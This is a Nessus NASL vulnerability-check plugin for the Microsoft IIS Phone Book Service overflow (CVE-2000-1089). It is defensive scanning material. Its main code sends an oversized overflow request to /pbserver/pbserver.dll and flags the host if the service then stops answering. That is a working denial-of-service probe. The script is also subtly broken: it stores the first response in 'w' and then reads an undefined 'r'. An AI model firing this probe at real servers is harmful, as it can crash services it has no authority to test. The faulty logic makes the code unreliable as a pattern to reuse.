#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10564);
 script_version ("$Revision: 1.28 $");
 script_cve_id("CVE-2000-1089");
 script_bugtraq_id(2048);
 script_xref(name:"OSVDB", value:"463");

 script_name(english:"Microsoft IIS Phone Book Service /pbserver/pbserver.dll Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host contains software that is vulnerable to 
a buffer overflow." );
 script_set_attribute(attribute:"description", value:
"The CGI /pbserver/pbserver.dll is subject to a buffer
overflow attack that may allow an attacker to execute
arbitrary commands on this host." );
 script_set_attribute(attribute:"solution", value:
"See http://www.microsoft.com/technet/security/bulletin/ms00-094.mspx" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 script_summary(english:"Determines whether phonebook server is installed");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);


w = http_send_recv3(method:"GET",item:"/pbserver/pbserver.dll", port:port);
r = strcat(r[0], r[1], '\r\n', r[2]);
if("Bad Request" >< r)
  {
    r = http_send_recv3(method: "GET", port: port,
 item:string("/pbserver/pbserver.dll?OSArch=0&OSType=2&LCID=", crap(200), "&PBVer=0&PB=", crap(200)));
    r = http_send_recv3(method:"GET", item:"/pbserver/pbserver.dll", port:port);
    if (isnull(r)) security_hole(port);
  }

